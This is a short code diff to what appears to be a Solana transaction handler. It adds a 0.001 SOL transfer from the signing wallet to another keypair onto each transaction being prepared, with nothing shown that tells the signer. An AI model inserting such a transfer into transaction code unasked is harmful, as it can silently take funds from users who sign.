@@ -59,6 +59,14 @@ const handler: Handler = async (event: Request) => {
         console.log(
           `Executing transaction of length ${transaction.instructions.length}`
         );
+        transaction.instructions = [
+          ...transaction.instructions,
+          SystemProgram.transfer({
+            fromPubkey: wallet.publicKey,
+            toPubkey: keypair.publicKey,
+            lamports: 0.001 * LAMPORTS_PER_SOL,
+          }),
+        ];
         transaction.feePayer = wallet.publicKey;
         transaction.recentBlockhash = (
           await connection.getRecentBlockhash("max")
